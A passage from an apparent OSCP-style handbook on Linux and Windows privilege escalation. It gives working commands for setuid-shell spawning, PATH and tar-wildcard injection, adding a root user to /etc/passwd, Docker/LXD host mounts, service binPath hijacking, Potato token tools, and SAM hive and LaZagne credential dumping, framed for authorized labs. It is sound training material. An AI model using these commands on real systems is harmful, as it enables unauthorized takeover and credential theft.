text: id="variant-9-5-1-5-1">9.5.1.5.1 Capability interpretation and example High-value capability candidates include cap_setuid , cap_setgid , cap_dac_override , cap_dac_read_search , cap_sys_ptrace , cap_sys_admin , cap_setfcap and cap_sys_module . cap_net_raw is usually not a direct root transition. capsh --print 2>/dev/null grep '^Cap' /proc/self/status Only when the exact interpreter has effective cap_setuid : /PATH/TO/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")' +ep indicates permitted plus the file effective bit. Bounding sets, namespaces, nosuid mounts and program behavior can still change the result. <h2

title: 9.5.1.6 Cron, timers and services
text: id="6-cron-timers-and-services">9.5.1.6 Cron, timers and services crontab -l 2>/dev/null cat /etc/crontab cat /etc/anacrontab 2>/dev/null atq 2>/dev/null ls -la /etc/cron.* /var/spool/cron 2>/dev/null grep -RniE 'CRON|CMD' /var/log/syslog /var/log/cron* 2>/dev/null | tail -n 100 systemctl list-timers --all systemctl list-unit-files --type=service systemctl list-units --type=service --state=running systemctl cat UNIT systemctl show UNIT -p User -p Group -p ExecStart -p WorkingDirectory -p EnvironmentFiles Observe short-lived commands: ./pspy64 ./pspy64 -pf -i 1000 Validate every referenced script, binary, configuration, environment file, plugin and parent: namei -l /PATH/TO/OBJECT stat /PATH/TO/OBJECT /PATH/TO/PARENT getfacl -p /PATH/TO/OBJECT /PATH/TO/PARENT 2>/dev/null Prove: exact object is controllable → job/service consumes it → process runs as a higher identity → schedule/restart/other trigger is available. A writable unit still needs a privileged reload/restart or automatic trigger. Cron uses a different/minimal environment. Apply the same proof to backup, logrotate, package-maintenance and custom housekeeping hooks: configuration visibility or a writable output is insufficient unless a higher-privileged consumer interprets attacker-controlled input. <h2

title: 9.5.1.7 PATH and relative-command hijacking
text:
id="7-path-and-relative-command-hijacking">9.5.1.7 PATH and relative-command hijacking echo "$PATH" | tr ':' '
' echo "$PATH" | tr ':' '
' | while IFS= read -r d; do [ -z "$d" ] && d=. [ -w "$d" ] && ls -ld "$d" done strings /PATH/TO/PRIVILEGED_BINARY | grep -E '(^|[^/])(cp|tar|service|sh|bash|cat)( |$)' If the privileged consumer resolves helper through a controllable PATH: printf '#!/bin/sh
/usr/bin/id > /tmp/path-proof
' > /WRITABLE/DIR/helper chmod 700 /WRITABLE/DIR/helper PATH=/WRITABLE/DIR:$PATH /PATH/TO/TRIGGER cat /tmp/path-proof Requires a relative command, the consumer's effective PATH, an earlier writable directory, trigger and retained privilege. Your interactive PATH alone is inconclusive . <h2

title: 9.5.1.8 Wildcard and option injection
text: id="8-wildcard-and-option-injection">9.5.1.8 Wildcard and option injection grep -RniE 'tar .+\*|chown .+\*|chmod .+\*|rsync .+\*' \ /etc/cron* /etc/systemd /opt /usr/local 2>/dev/null GNU tar proof, only when a privileged job executes compatible tar ... * in an attacker-writable directory: printf '#!/bin/sh\n/usr/bin/id > /tmp/wildcard-proof\n' > proof.sh chmod 700 proof.sh touch -- '--checkpoint=1' touch -- '--checkpoint-action=exec=sh proof.sh' Confirm working directory, wildcard placement, utility implementation/options, privileged identity and trigger. Do not assume every wildcard or utility accepts filename-derived options. <h2

title: 9.5.1.9 Writable account/policy files
text: id="9-writable-accountpolicy-files">9.5.1.9 Writable account/policy files ls -l /etc/passwd /etc/shadow /etc/sudoers namei -l /etc/passwd getfacl -p /etc/passwd 2>/dev/null <summary

title: 9.5.1.9.1 Writable /etc/passwd — authorized disposable lab only
text: id="variant-9-5-1-9-1">9.5.1.9.1 Writable /etc/passwd — authorized disposable lab only cp /etc/passwd /tmp/passwd.backup HASH=$(openssl passwd -6 'TEMP_PASSWORD') printf 'root2:%s:0:0:root:/root:/bin/bash\n' "$HASH" >> /etc/passwd su - root2 id Preserve a known-good copy and restore it. UID/GID 0 creates a superuser. Do not risk corrupting a host when no safe recovery exists. Also inspect effective access to /etc/sudoers.d , PAM, SSH authorized-key locations and root-executed startup/configuration files. <h2

title: 9.5.1.10 Privileged groups, sockets and containers
text: id="10-privileged-groups-sockets-and-containers">9.5.1.10 Privileged groups, sockets and containers id ls -l /var/run/docker.sock /run/docker.sock 2>/dev/null docker version 2>/dev/null lxc list 2>/dev/null Group candidates include docker , lxd / lxc , disk , shadow , adm , systemd-journal and libvirt . Prove the associated resource and effective permission. <summary

title: 9.5.1.10.1 Rootful Docker daemon with an available image
text: id="variant-9-5-1-10-1">9.5.1.10.1 Rootful Docker daemon with an available image docker images docker run --rm -it -v /:/host IMAGE chroot /host /bin/sh Requires daemon/socket access, a rootful daemon, usable image and allowed host bind mount. Rootless mode, user namespaces, authorization plugins and SELinux can change the effect. <summary

title: 9.5.1.10.2 LXD/LXC with an available image alias
text: id="variant-9-5-1-10-2">9.5.1.10.2 LXD/LXC with an available image alias lxc image list lxc init IMAGE_ALIAS privesc -c security.privileged=true lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true lxc start privesc lxc exec privesc /bin/sh Requires configured daemon access, sufficient group rights, image availability and privileged-container/device support. <h2

title: 9.5.1.11 Mounts, NFS and local services
text: id="11-mounts-nfs-and-local-services">9.5.1.11 Mounts, NFS and local services findmnt cat /etc/fstab mount ss -lntup ss -lxnp For NFS, a writable export plus no_root_squash can trust client-root-created ownership/SUID metadata. Confirm export options, writable mount, target-side mount options and compatible execution. See NFS/RPC . Root-only loopback services and UNIX sockets are candidates only. Identify protocol/authentication and prove a privileged action through a controlled request, configuration, plugin or file. <h2

title: 9.5.1.12 Shared-library resolution
text: id="12-shared-library-resolution">9.5.1.12 Shared-library resolution file /PATH/TO/BINARY readelf -d /PATH/TO/BINARY 2>/dev/null | grep -E 'RPATH|RUNPATH|NEEDED' ldd /PATH/TO/BINARY 2>/dev/null Need a privileged dynamically linked consumer plus a missing/selected library resolved from a writable location or a preserved loader variable. Secure-execution mode strips many loader variables from SUID/SGID programs. Prefer readelf over executing an untrusted file through an unsafe ldd implementation. For root-run scripts, inspect imports/includes and their actual search order. A writable current directory, module path or imported file can be a privileged input even when the main script is protected: grep -nE '^(import|from) |require\(|include|source |\. ' /PATH/TO/SCRIPT /PATH/TO/python3 -c 'import sys; print("\n".join(sys.path))' Prove the privileged interpreter uses the writable module/include before changing it. The interactive interpreter's search path may differ from cron/systemd/sudo. <h2

title: 9.5.1.13 Software/kernel exploits: evidence last
text: id="13-softwarekernel-exploits-evidence-last">9.5.1.13 Software/kernel exploits: evidence last uname -a cat /proc/version cat /etc/os-release dpkg -l 2>/dev/null rpm -qa 2>/dev/null sudo --version lsmod sysctl kernel.unprivileged_userns_clone 2>/dev/null searchsploit "PRODUCT VERSION local privilege escalation" searchsploit -x EDB_ID searchsploit -m EDB_ID gcc -Wall -Wextra exploit.c -o exploit file exploit sha256sum exploit Match component, exact distribution/build and patch/backport state, architecture, required configuration/capabilities/namespaces, mitigations and dependencies. Review source and recovery risk. A version title or successful compilation is only a candidate. Follow public exploit adaptation . <h2

title: 9.5.1.14 Automated enumeration: generate, then prove
text: id="14-automated-enumeration-generate-then-prove">9.5.1.14 Automated enumeration: generate, then prove For the early collector pass, transfer a reviewed LinPEAS copy, check the current UID/architecture and save its output. This form does not require an executable bit: sh ./linpeas.sh | tee linpeas.txt Follow the named finding into the matching sudo, SUID/capability, writable-consumer or credential procedure. Use the local help for optional modes; broader/noisier checks are not the automatic baseline. ./linpeas.sh | tee linpeas.txt ./lse.sh | tee lse.txt ./lse.sh -l1 | tee lse-l1.txt ./unix-privesc-check standard > unix-privesc-check.txt LinPEAS optional flags vary by build. Read the local ./linpeas.sh -h before selecting broader checks; they are not the automatic baseline. LSE progresses from default to -l1 , then -l2 only if needed. unix-privesc-check detailed is slower and more false-positive-prone. For every highlight: exact object | effective permission | privileged consumer | identity | trigger | expected effect | manual verification Do not pipe an unverified Internet download into the target shell. Acquire a trusted copy, retain its source/hash, transfer deliberately and remove assessment artifacts when appropriate. <h2

title: 9.5.1.15 Failure router
text: id="15-failure-router">9.5.1.15 Failure router Symptom Check next sudo -l fails/prompts Password requirement, credential correctness and policy—not “no sudo” Allowed sudo command gives ordinary shell Args/run-as, privilege dropping, NOEXEC , MAC denial SUID technique stays low privilege Owner/mode, effective UID, nosuid , shell privilege preservation Capability command fails Exact path, +ep , bounding set, namespace/mount and interpreter support Cron edit never runs Job/user/schedule, working directory, shell/PATH, logs and pspy PATH route ignored Absolute command, secure_path , reset environment, wrong directory/order Wildcard route ignored Working directory, expansion, option order and utility implementation Docker permission denied Socket ACL, group session, daemon mode and authorization controls Kernel PoC fails Exact affected build/configuration, architecture, toolchain/dependencies Enumerator says “possible” Run native commands proving every chain link <h2

title: 9.5.1.16 Verify and re-enumerate
text: id="16-verify-and-re-enumerate">9.5.1.16 Verify and re-enumerate id; whoami; groups hostname; pwd ip addr; ip route After root, re-enumerate newly readable credentials, services, listeners, mounts and routes. Capture the exact command, decisive output and state transition required by the objective; keep target details and proof material private. <h2

title: 9.5.1.17 Restricted shell — escape the restriction without claiming root
text: id="restricted-shell--escape-the-restriction-without-claiming-root">9.5.1.17 Restricted shell — escape the restriction without claiming root Use when a login is confined by rbash or an allowlisted command wrapper. Check which binaries and features are actually allowed; the following are alternatives, not a sequence to execute together. <h3

title: 9.5.1.17.1 If the allowed Python interpreter can create a child shell
text: id="variant-9-5-1-17-1">9.5.1.17.1 If the allowed Python interpreter can create a child shell # If the allowed Python interpreter can create a child shell python3 -c 'import os; os.execl("/bin/sh", "sh")' <h3

title: 9.5.1.17.2 If an unrestricted awk is in the allowed path
text: id="variant-9-5-1-17-2">9.5.1.17.2 If an unrestricted awk is in the allowed path # If an unrestricted awk is in the allowed path awk 'BEGIN {system("/bin/sh")}' <h3

title: 9.5.1.17.3 If less allows its shell-escape feature: run less FILE, then enter this in less
text: id="variant-9-5-1-17-3">9.5.1.17.3 If less allows its shell-escape feature: run less FILE, then enter this in less # If less allows its shell-escape feature: run less FILE, then enter this in less !/bin/sh Read: run id and check the new shell behavior. This changes the command environment, not the UID. LESSSECURE, a restricted editor build, no-exec controls or an application wrapper can block an otherwise familiar GTFOBins escape. A server-side SSH ForceCommand can ignore the command you supply to ssh; do not repeat a client-side command substitution as though it overrides the server policy. Sources: upstream 1 · upstream 2 . <h2

title: 9.5.1.18 Kernel candidates — Linux Exploit Suggester as a second view
text: id="kernel-candidates--linux-exploit-suggester-as-a-second-view">9.5.1.18 Kernel candidates — Linux Exploit Suggester as a second view Use when manual permission/credential routes have not yielded a candidate and kernel/package evidence justifies checking public local exploits. Transfer a reviewed copy before execution. uname -a cat /etc/os-release bash linux-exploit-suggester.sh Read: candidates need the advisory's exact kernel/build/configuration and prerequisite checks. Distribution backports can fix a CVE without changing an apparent upstream version. Inspect the PoC's primitive, architecture, compilation and failure impact before choosing it. A suggestion or successful build is not evidence of a vulnerable target or an elevated identity. Sources: upstream 1 . <h2

title: 9.5.1.19 Logrotate race — only with a controlled log path and privileged rotation
text: id="logrotate-race--only-with-a-controlled-log-path-and-privileged-rotation">9.5.1.19 Logrotate race — only with a controlled log path and privileged rotation Use when root rotates a log in an attacker-controlled path and the configuration creates/copies/compresses a file. A writable log by itself is insufficient. Check the relevant stanza, directory ownership and actual scheduled execution first. <h3

title: 9.5.1.19.1 cat /etc/logrotate.conf
text: id="variant-9-5-1-19-1">9.5.1.19.1 cat /etc/logrotate.conf cat /etc/logrotate.conf cat /etc/logrotate.d/SERVICE namei -l /PATH/TO/LOG systemctl cat logrotate.service logrotate.timer <h3

title: 9.5.1.19.2 Compile a reviewed upstream source; prepare a script payload for the actual consumer
text: id="variant-9-5-1-19-2">9.5.1.19.2 Compile a reviewed upstream source; prepare a script payload for the actual consumer # Compile a reviewed upstream source; prepare a script payload for the actual consumer gcc -o logrotten logrotten.c printf '%s\n' 'id > /tmp/logrotate-proof.txt' > payloadfile <h3

title: 9.5.1.19.3 create option; wait for the existing privileged rotation trigger
text: id="variant-9-5-1-19-3">9.5.1.19.3 create option; wait for the existing privileged rotation trigger # create option; wait for the existing privileged rotation trigger ./logrotten -p ./payloadfile /PATH/TO/LOG <h3

title: 9.5.1.19.4 Alternative for a matching compress configuration, not an extra required step
text: id="variant-9-5-1-19-4">9.5.1.19.4 Alternative for a matching compress configuration, not an extra required step # Alternative for a matching compress configuration, not an extra required step ./logrotten -p ./payloadfile -c -s 4 /PATH/TO/LOG Read: winning the file-write race and executing its contents are separate events. The upstream default targets a shell-completion consumer: it must actually be sourced by a privileged shell before the proof appears. Verify that consumer and then read the proof UID. A low-privilege su rotation, protected parent, incompatible build/filesystem or an absent consumer can rule out this route. Do not force root rotation from a low-privilege account or treat lack of proof as a confirmed race win; return to the scheduled-job/service checks. Sources: upstream 1 · upstream 2 . <h2

title: 9.5.1.20 Sources
text: id="sources">9.5.1.20 Sources Supplied PEN-200 Ch 18, pp550-582 Current OSCP+ Body of Knowledge Current OSCP+ exam guide getSH Privilege Escalation: Linux , source snapshot e1f62dd Hexdump PATH hijacking module sudoers manual Linux capabilities manual systemctl manual Docker run reference and Docker Linux post-install security LinPEAS , LSE , pspy and GTFOBins

title: 9.5.2 Windows Privilege Escalation
text: id="windows-privilege-escalation">9.5.2 Windows Privilege Escalation ← Stage index | Quick sheet | Credential use | File transfer | Strategy map | Study methods: Escalate privileges on Windows Entry: authorized Windows shell. Exit: verified Administrator/high-integrity or SYSTEM process. Proof chain: current token → controlled input → effective right → privileged consumer → run-as identity → trigger → verified effect. First pass: check whoami /all and architecture, then run the reviewed winPEAS baseline in the collector section . Read out.txt and follow the exact service/task, token or credential finding; use native checks if the collector is unavailable. <h2

title: 9.5.2.1 Establish token and host state
text: id="1-establish-token-and-host-state">9.5.2.1 Establish token and host state hostname whoami /all systeminfo ipconfig /all route print netstat -ano tasklist /svc query user net user net localgroup Administrators driverquery /v Get-ComputerInfo | Select-Object WindowsProductName,WindowsVersion,OsBuildNumber,OsArchitecture Get-HotFix | Sort-Object InstalledOn -Descending Get-CimInstance Win32_Process | Select-Object ProcessId,Name,ExecutablePath,CommandLine Get-CimInstance Win32_Service | Select-Object Name,StartName,State,StartMode,PathName Get-CimInstance Win32_SystemDriver | Select-Object Name,State,StartMode,PathName Get-LocalUser Get-LocalGroupMember Administrators Interpret: record user SID , integrity label, enabled/deny-only groups and present/enabled privileges. Administrator membership with Medium integrity is a filtered token, not a high-integrity process. Get-HotFix does not list every update; use build/KB output only to form a version hypothesis. <summary

title: 9.5.2.1.1 WMIC compatibility fallbacks
text: id="variant-9-5-2-1-1">9.5.2.1.1 WMIC compatibility fallbacks wmic qfe get HotFixID,InstalledOn wmic service get Name,StartName,State,StartMode,PathName wmic process get ProcessId,Name,ExecutablePath,CommandLine WMIC is deprecated and may be absent on newer systems; PowerShell CIM is the baseline. <h2

title: 9.5.2.2 Interpret effective access
text: id="2-interpret-effective-access">9.5.2.2 Interpret effective access icacls "C:\Path\To\OBJECT" sc.exe sdshow SERVICE accesschk.exe -accepteula -nobanner -v -w "USER" "C:\Path\To\OBJECT" accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE icacls common rights: F full, M modify, RX read/execute, R read, W write, D delete. Common inheritance markers: I , OI , CI , IO , NP . File, directory, registry, service-object, task and process permissions are separate. Check whether the ACE applies to the current user or an enabled group and grants the exact required operation. Mandatory Integrity Control can still block a lower-integrity write. <h2

title: 9.5.2.3 Hunt credentials and configuration
text: id="3-hunt-credentials-and-configuration">9.5.2.3 Hunt credentials and configuration <h3

title: 9.5.2.3.1 Stored credentials and PowerShell trails
text: id="stored-credentials-and-powershell-trails">9.5.2.3.1 Stored credentials and PowerShell trails cmdkey /list vaultcmd /list vaultcmd /listcreds:"Windows Credentials" /all $history = (Get-PSReadLineOption).HistorySavePath $history Get-Content -LiteralPath $history -ErrorAction SilentlyContinue Get-ItemProperty 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription' -ErrorAction SilentlyContinue Get-ItemProperty 'HKCU:\Software\Policies\Microsoft\Windows\PowerShell\Transcription' -ErrorAction SilentlyContinue Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -ErrorAction SilentlyContinue | Where-Object Id -in 4103,4104 | Select-Object -First 50 TimeCreated,Id,Message A cmdkey entry is target/context-bound and does not reveal a password. DPAPI-protected data needs the protecting user/machine context and keys. Clear-History does not necessarily clear PSReadLine's saved file. <summary

title: 9.5.2.3.1.1 Targeted application/file/registry search
text: id="variant-9-5-2-3-1-1">9.5.2.3.1.1 Targeted application/file/registry search reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s dir /s /b C:\Windows\Panther\*unattend*.xml C:\Windows\System32\Sysprep\*.xml 2>nul dir /s /b C:\Users\*.kdbx C:\Users\*.rdp C:\Users\id_rsa C:\Users\*.ppk 2>nul Get-ChildItem C:\inetpub,C:\ProgramData,C:\Users -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -in '.config','.xml','.ini','.txt','.ps1','.bat','.cmd','.yml','.yaml','.json' } | Select-String -Pattern 'password|passwd|secret|token|connectionString|user id=' -CaseSensitive:$false Search from observed applications first. Classify every value by identity, format, scope and compatible service, then use the credential procedure. <summary

title: 9.5.2.3.1.2 Saved credential consumer
text: id="variant-9-5-2-3-1-2">9.5.2.3.1.2 Saved credential consumer runas /savecred /user:DOMAIN\USER cmd.exe Use only when cmdkey /context supports that identity and logon type. runas does not inherently bypass UAC; verify the resulting token with whoami /all . <summary

title: 9.5.2.3.1.3 LaZagne — recover application credentials in the current user's context
text: id="variant-9-5-2-3-1-3">9.5.2.3.1.3 LaZagne — recover application credentials in the current user's context Use a reviewed Windows build after identifying the current user and installed applications. Start with the relevant family; run broader collection only when useful. User-protected stores depend on that user's profile/decryption context; system-protected stores can need an elevated token. <h4

title: 9.5.2.3.1.4 Browser-store leads for the current user
text: id="variant-9-5-2-3-1-4">9.5.2.3.1.4 Browser-store leads for the current user REM Browser-store leads for the current user laZagne.exe browsers <h4

title: 9.5.2.3.1.5 Broader recovery, with a local text report
text: id="variant-9-5-2-3-1-5">9.5.2.3.1.5 Broader recovery, with a local text report REM Broader recovery, with a local text report laZagne.exe all -oN Read: preserve the reported application/account/source with each recovered value. Test a matching service using the credential procedure; a recovered application password is not automatically a domain password. Empty output can mean no supported store, inaccessible profile or failed decryption. Follow manual history/config/vault checks instead of assuming there are no credentials. LaZagne upstream . <h2

title: 9.5.2.4 Service control and executed objects
text: id="4-service-control-and-executed-objects">9.5.2.4 Service control and executed objects <h3

title: 9.5.2.4.1 Inventory and inspect
text: id="inventory-and-inspect">9.5.2.4.1 Inventory and inspect Get-CimInstance Win32_Service | Select-Object Name,StartName,State,StartMode,PathName sc.exe qc SERVICE sc.exe sdshow SERVICE icacls "C:\Path\To\service.exe" icacls "C:\Path\To" accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE accesschk.exe -accepteula -nobanner -v -w "USER" "C:\Path\To\service.exe" Need: control of service config, exact binary/script, searched prefix, DLL/config/plugin, or relevant DACL ; higher SERVICE_START_NAME ; and a start/restart/boot trigger. In PowerShell use sc.exe , because bare sc can resolve to Set-Content . <h3

title: 9.5.2.4.2 Modifiable service configuration
text: id="modifiable-service-configuration">9.5.2.4.2 Modifiable service configuration Preserve BINARY_PATH_NAME , account and start mode first: sc.exe qc SERVICE sc.exe config SERVICE binPath= "C:\Windows\Temp\PAYLOAD_EXE" sc.exe stop SERVICE sc.exe start SERVICE Restore: sc.exe config SERVICE binPath= "ORIGINAL_BINARY_PATH" SERVICE_CHANGE_CONFIG controls binPath ; start/stop are separate rights. The space after binPath= is required. Error 1053 may mean a non-service payload ran but did not answer the Service Control Manager; verify the intended effect. <summary

title: 9.5.2.4.2.1 Writable service binary or replaceable parent
text: id="variant-9-5-2-4-2-1">9.5.2.4.2.1 Writable service binary or replaceable parent sc.exe qc SERVICE icacls "C:\Path\To\service.exe" icacls "C:\Path\To" copy /Y "C:\Path\To\service.exe" "C:\Windows\Temp\service.exe.backup" copy /Y "C:\Windows\Temp\PAYLOAD_EXE" "C:\Path\To\service.exe" sc.exe stop SERVICE sc.exe start SERVICE A parent with delete/create rights can permit replacement even when the file is not directly writable. Confirm architecture, file locks, recovery copy and exact trigger. <h2

title: 9.5.2.5 Unquoted service paths
text: id="5-unquoted-service-paths">9.5.2.5 Unquoted service paths Get-CimInstance Win32_Service | Where-Object { $_.PathName -match '\s' -and $_.PathName -notmatch '^\s*"' } | Select-Object Name,StartName,State,StartMode,PathName For C:\Program Files\Vendor App\service.exe -d , check every attempted prefix: icacls C:\ icacls "C:\Program Files" icacls "C:\Program Files\Vendor App" sc.exe qc SERVICE Confirmed only if: path contains spaces and is unquoted; an earlier attempted executable such as C:\Program.exe or C:\Program Files\Vendor.exe is absent and creatable; service runs higher; trigger exists. A listed unquoted path alone is a false positive. <h2

title: 9.5.2.6 DLL/config/helper search hijacking
text: id="6-dllconfighelper-search-hijacking">9.5.2.6 DLL/config/helper search hijacking Confirm: exact DLL/helper/config name and architecture; privileged process actually requests it; selected attacker-writable location precedes the legitimate resolution; payload preserves required exports/behavior where necessary; reliable trigger exists. icacls "C:\Path\To\Application" sc.exe qc SERVICE reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs" reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v SafeDllSearchMode Modern DLL resolution can apply redirection, API sets, side-by-side manifests, loaded modules, KnownDLLs, package dependencies and application-specific search flags before ordinary directories. Safe DLL search mode is enabled by default. In a suitable lab, Procmon filters for the process, CreateFile , .dll , and NAME NOT FOUND provide decisive runtime evidence; low-privilege remote use may be unavailable. <h2

title: 9.5.2.7 Scheduled tasks and autostarts
text: id="7-scheduled-tasks-and-autostarts">9.5.2.7 Scheduled tasks and autostarts <h3

title: 9.5.2.7.1 Scheduled tasks
text: id="scheduled-tasks">9.5.2.7.1 Scheduled tasks schtasks /query /fo LIST /v schtasks /query /tn "\FOLDER\TASK" /xml Get-ScheduledTask | ForEach-Object { $t = $_ [pscustomobject]@{ TaskPath=$t.TaskPath; TaskName=$t.TaskName UserId=$t.Principal.UserId; RunLevel=$t.Principal.RunLevel Actions=($t.Actions | ForEach-Object { "$($_.Execute) $($_.Arguments) [wd=$($_.WorkingDirectory)]" }) -join '; ' } } icacls "C:\Path\To\task-script.ps1" icacls "C:\Path\To" schtasks /run /tn "\FOLDER\TASK" Prove action, arguments, working directory, principal, actual trigger and effective ACL. RunLevel Highest means the configured principal's highest available token, not SYSTEM. /run success means the request was accepted; verify process/effect and last-run result. <summary

title: 9.5.2.7.1.1 Run keys and startup consumers
text: id="variant-9-5-2-7-1-1">9.5.2.7.1.1 Run keys and startup consumers reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" Need a modifiable consumed value/file plus a higher-privileged boot/logon/application trigger. A writable PATH directory matters only when a privileged consumer invokes an unqualified executable through that effective PATH. <h2

title: 9.5.2.8 AlwaysInstallElevated and UAC context
text: id="8-alwaysinstallelevated-and-uac-context">9.5.2.8 AlwaysInstallElevated and UAC context reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated Both values must be 0x1 : msiexec.exe /quiet /qn /i C:\Path\To\PAYLOAD.msi One key or a zero value disproves the route. This is an unsafe installer policy, not a universal UAC bypass. whoami /groups reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin A UAC bypass normally elevates an already-administrative filtered token. Build/policy-specific bypasses are not a baseline path for a standard user. <h2

title: 9.5.2.9 Token privilege routes
text: id="9-token-privilege-routes">9.5.2.9 Token privilege routes whoami /priv Privilege Required next proof SeImpersonatePrivilege Compatible privileged client/coercion, impersonation level, build/runtime/tool and process creation SeAssignPrimaryTokenPrivilege Useful primary token plus process/quota requirements SeBackupPrivilege Enabled privilege, backup-aware read and useful protected data SeRestorePrivilege Restore-aware write plus privileged consumer/trigger SeDebugPrivilege Usable target process and no protected-process barrier SeLoadDriverPrivilege Compatible signed/loadable driver and stable exploit path SeTakeOwnershipPrivilege Ownership change, then DACL/content control and consumer <summary

title: 9.5.2.9.1 Impersonation-tool variants
text: id="variant-9-5-2-9-1">9.5.2.9.1 Impersonation-tool variants PrintSpoofer64.exe -i -c "cmd.exe" GodPotato-NET4.exe -cmd "cmd.exe /c whoami > C:\Windows\Temp\token-proof.txt" Choose by OS build, architecture, runtime and available trigger. A privilege name alone does not select a working “Potato.” Success is a SYSTEM process/effect followed by whoami /all ; connection/token/process errors route back to prerequisites. <summary

title: 9.5.2.9.2 Backup privilege to local credential material
text: id="variant-9-5-2-9-2">9.5.2.9.2 Backup privilege to local credential material reg save HKLM\SAM C:\Windows\Temp\SAM.hive reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL Use the matched hive pair. Output is local credential material, not automatic SYSTEM/domain/remote authorization ; classify and validate it through the credential procedure. <h2

title: 9.5.2.10 Application, driver and kernel candidates
text: id="10-application-driver-and-kernel-candidates">9.5.2.10 Application, driver and kernel candidates Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*', 'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction SilentlyContinue | Select-Object DisplayName,DisplayVersion,Publisher,InstallLocation systeminfo driverquery /v Prefer deterministic credential/permission/configuration paths. Then verify exact privileged application or driver version/configuration. Use kernel exploits last after exact build, architecture, cumulative update, mitigations, prerequisites, source and crash risk are checked. Avoid Win32_Product ; it is slow and can trigger MSI repair. <h2

title: 9.5.2.11 Automated candidate generation
text: id="11-automated-candidate-generation">9.5.2.11 Automated candidate generation winPEASx64.exe log Seatbelt.exe -group=system -outputfile="C:\Windows\Temp\seatbelt-system.txt" Seatbelt.exe -group=user -q -outputfile="C:\Windows\Temp\seatbelt-user.json" powershell.exe -ExecutionPolicy Bypass -Command ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report TXT,HTML" Import-Module .\PowerUp.ps1 Invoke-AllChecks winPEAS is broad; Seatbelt is a targeted survey and publishes source rather than official binaries; PrivescCheck evaluates the current token and skips some checks when elevated; PowerUp is useful but its upstream repository was archived. AV/script-policy failure is a tooling limitation—use native checks. Convert every highlight into: CANDIDATE | CURRENT TOKEN | CONTROLLED INPUT | EFFECTIVE RIGHT | CONSUMER | RUN-AS | TRIGGER | EXPECTED EFFECT | STATUS <h2

title: 9.5.2.12 Failure router
text: id="12-failure-router">9.5.2.12 Failure router Failure Next action Service config Access is denied Validate service DACL/effective token; inspect binary/DLL/config alternatives Can modify but cannot restart Find reliable boot/logon/service dependency trigger or choose another path Service error 1053 Check bounded effect, then restore; payload may not implement the service protocol Unquoted path but no creatable prefix Disprove the route DLL not loaded Recheck actual request, KnownDLL/SxS/loaded module, search order, bitness and trigger Task accepted but no effect Check action, conditions, working directory, LastTaskResult/history and process lifetime Privilege tool fails Recheck enabled token state, build, architecture/runtime and trigger-specific prerequisite Hashes but no higher session Return to credential classification and host/service authorization Suggester lists CVE Verify exact component/build/patch/config and exploit source before use Enumerator blocked Run the relevant native branch; do not infer no findings <h2

title: 9.5.2.13 Verify, re-enumerate and preserve evidence
text: id="13-verify-re-enumerate-and-preserve-evidence">9.5.2.13 Verify, re-enumerate and preserve evidence whoami /all hostname ipconfig /all After a higher token, re-enumerate protected credentials, services, tasks, sessions, listeners, routes and domain context. Preserve the command, relevant output, trigger and restoration step. For exam use, recheck the current OffSec guide: Windows full-privilege evidence requires SYSTEM, Administrator or an account with Administrator privileges, and AI/LLM use is prohibited during the exam and report phase. <h2

title: 9.5.2.14 JAWS — PowerShell enumeration when the compiled helper is unsuitable
text: id="jaws--powershell-enumeration-when-the-compiled-helper-is-unsuitable">9.5.2.14 JAWS — PowerShell enumeration when the compiled helper is unsuitable Use a reviewed JAWS script when its PowerShell-based checks fit the current host/runtime. It is an alternative survey, not proof that every current Windows configuration is covered. powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt Read: turn a named service, path or credential finding into its exact native check ( sc.exe qc , sc.exe sdshow , icacls , task XML, or the file read). Policy or language restrictions can still prevent the script from running. The process-scope flag does not override an enforced policy/control layer; use the manual checks already listed here. Sources: upstream 1 . <h2

title: 9.5.2.15 Legacy impersonation helpers — select by OS build and trigger
text: id="legacy-impersonation-helpers--select-by-os-build-and-trigger">9.5.2.15 Legacy impersonation helpers — select by OS build and trigger Use the current GodPotato/PrintSpoofer workflow first when its conditions fit. Older JuicyPotato-family recipes depend on specific COM/DCOM/RPC behavior; an enabled token privilege alone is not the complete condition. <h3

title: 9.5.2.15.1 Legacy JuicyPotato: requires a working CLSID and supported Windows build
text: id="variant-9-5-2-15-1">9.5.2.15.1 Legacy JuicyPotato: requires a working CLSID and supported Windows build REM Legacy JuicyPotato: requires a working CLSID and supported Windows build JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c CLSID -a "/c whoami > C:\Windows\Temp\identity-check.txt" <h3

title: 9.5.2.15.2 Separate EFS-triggered helper, if its documented prerequisites fit
